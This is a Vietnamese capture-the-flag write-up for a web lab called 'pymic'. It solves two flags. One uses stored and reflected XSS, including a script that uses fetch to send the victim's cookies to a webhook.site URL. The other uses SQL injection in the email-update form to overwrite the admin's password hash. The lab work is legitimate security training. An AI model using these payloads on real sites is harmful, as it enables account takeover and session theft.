# Mục tiêu
**Có 6 flag**
# Khai thác

## Bị lỗi XSS ở `username`
Thử tạo account có username là payload `<h1>lethimcook</h1>` và kiểm tra thử trong `/profile`, phát hiện có sự thay đổi, username xuống dòng thay vì nằm chung dòng như bình thường    
![alt text](images/pymic/image-1.png)  

Thử tạo lại với username `<script>alert(1)</script>`. Thế là trang bị lỗi XSS ở trường username.  
![alt text](images/pymic/image-2.png)  

## Trường email của user bị SQLi
Khi thử với nháy đơn thì server báo lỗi. Vì đây là chức năng chỉnh sửa email nên có thể ứng dụng có thể sử dụng câu truy vấn là  `UPDATE users SET email={data} WHERE username={người dùng} AND id={id}`.  

Trong quá trình test, mình phát hiện rằng mình có thể thay đổi email của bản thân mình với payload `sqli@gmail.com'+WHERE+username='vuadosat1'--`  
![alt text](images/pymic/image-8.png)  


Mình muốn test xem với SQLi này, mình có thể cập nhật thông tin trên db của user khác không, mình sẽ tạo thêm một user mới với username=`vuadosattest` và password=`1` và email=`1@gmail.com`  
![alt text](images/pymic/image-7.png)  

Thử thay đổi email của user test trên với payload `testsql1@gmail.com' WHERE username='vuadosattest'--`  
**LƯU Ý** Mỗi test case cần đảm bảo email phải unique, nếu không, dù payload có chính xác thì vẫn báo lỗi

Vậy là có thể thay đổi credential của người khác, vậy sẽ ra sao nếu ta thay đổi password của admin. Các tên như `password, pass, passwd, password_hash` thường sử dụng để đặt tên cột cho mật khẩu. Trong trường hợp này sẽ là `password_hash`  
Vậy là password có sử dụng thuật toán băm, chúng ta phải tìm chính xác thuật toán thì mới có thể đăng nhập được.  
`MD5, SHA1` thường được sử dụng trong MySQL, chúng ta sẽ thử với những thuật toán này. Nhưng có vẻ khá khoai, thử xong thì đăng nhập báo server báo lỗi luôn  
![alt text](images/pymic/image-9.png)   

Vậy sẽ ra sao, nếu ta gán password user admin bằng với password của user bình thường?
Mình sẽ tạo thêm tài khoản có `username=vuadosat2` và `password=2` để thử trong bước này  
Chúng ta thử với `JOIN` 
```
UPDATE users AS ad JOIN users AS self ON self.username="vuadosat" SET ad.password_hash=self.password_hash WHERE username="admin"
```

Tuy nhiên JOIN bị một vấn đề là ta phải thêm một command nữa ngăn cách bởi dấu `;`, và chương trình sẽ trả về lỗi nếu param có dấu `;`  
Chúng ta sẽ thử với SELECT lồng ghép. Sử dụng payload dưới, password user admin sẽ trở thành password của user `vuadosat2` do mình tạo với password là `2`
```
new_email=kakakaka@gmail.com',password_hash=(SELECT+password_hash+FROM+(SELECT+*+FROM+users)+AS+a+WHERE+username%3d'vuadosat2')+WHERE+username%3d'admin'+--
```

Sau khi gửi payload trên, chúng ta đã có thể đăng nhập admin với `password=2`  
![alt text](images/pymic/image-11.png)  

Truy cập `/profile` của admin lấy flag  
![alt text](images/pymic/image-10.png)
**FLAG** CBJS{99fb83031ce9923c84392b4e92f956b5} 


## Lỗi XSS trong tại `\profile?success=`
Nhận thấy nội dung "Email updated successfully" dựa trên param success  
![alt text](images/pymic/image-4.png)  

Thử thêm script vào param, phát hiện trang web bị lỗi XSS  
![alt text](images/pymic/image-5.png)  

Như vậy là chúng ta đã xác định lỗi XSS với GET param. Dựa vào đó, ta có thể viết một đoạn script để lấy cookie của nạn nhân bằng `fetch`   
Thêm payload vào sau param `successs`
```
<script>fetch(`https://webhook.site/9280fdc8-b60f-4699-96ba-b1cdb5278797?$a={document.cookie}`)</script>
```

Lấy cookie của nạn nhân trên webhook, thay vào cookie trình duyệt và lấy được flag trên trang `profile`  của nạn nhân  
![alt text](images/pymic/image-6.png)  

**FLAG** CBJS{df764cbdea00d65edcd07bb9953ad2b7}  